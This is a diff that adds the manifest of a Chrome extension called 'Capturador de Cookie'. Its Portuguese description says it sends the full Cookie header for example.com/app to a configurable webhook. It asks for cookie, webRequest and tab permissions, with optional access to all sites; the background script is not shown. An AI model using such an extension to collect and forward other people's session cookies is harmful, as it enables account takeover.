@@ -1,0 +1,16 @@
+{
+  "manifest_version": 3,
+  "name": "Capturador de Cookie",
+  "version": "1.3.0",
+  "description": "Envia o Cookie completo do GET https://www.example.com/app (igual ao Network) para um webhook configurável.",
+  "permissions": ["cookies", "storage", "tabs", "webRequest"],
+  "host_permissions": ["https://www.example.com/*"],
+  "optional_host_permissions": ["http://*/*", "https://*/*"],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "options_page": "options.html",
+  "action": {
+    "default_title": "Capturador de Cookie — abra Opções"
+  }
+}
